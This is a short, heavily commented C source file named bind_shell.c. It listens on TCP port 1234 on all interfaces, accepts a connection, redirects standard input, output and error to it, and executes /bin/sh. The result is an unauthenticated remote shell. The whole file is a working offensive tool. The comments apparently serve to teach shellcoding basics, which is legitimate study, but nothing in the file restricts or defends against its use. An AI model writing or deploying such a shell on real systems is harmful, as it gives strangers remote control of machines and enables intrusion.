// Author :  Alessio Parzian
// Filename: bind_shell.c

// Compile with:
// 		gcc bind_shell.c -o bind_shell

#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main()
{
	// Create the socket (man socket)
	// AF_INET for IPv4
	// SOCK_STREAM for TCP connection
	// 0 leaves it up to the service provider for protocol, which will be TCP
	int host_sock = socket(AF_INET, SOCK_STREAM, 0);

	// Create sockaddr_in struct (man 7 ip)
	struct sockaddr_in host_addr;

	// AF_INET for IPv4
	host_addr.sin_family = AF_INET;
	
	// Set port number to 1234, set to network byte order by htons
	host_addr.sin_port = htons(1234);

	// Listen on any interface
	host_addr.sin_addr.s_addr = INADDR_ANY;
	
	// Bind address to socket (man bind)
	bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));

	// Use the created socket to listen for connections (man listen)
	listen(host_sock, 0);

	// Accept connections, (man 2 accept) use NULLs to not store connection information from peer
	int client_sock = accept(host_sock, NULL, NULL);

	// Redirect stdin to client
	dup2(client_sock, 0);
	
	// stdout
	dup2(client_sock, 1);

	// stderr
	dup2(client_sock, 2);

	// Execute /bin/sh (man execve)
	execve("/bin/sh", NULL, NULL);

}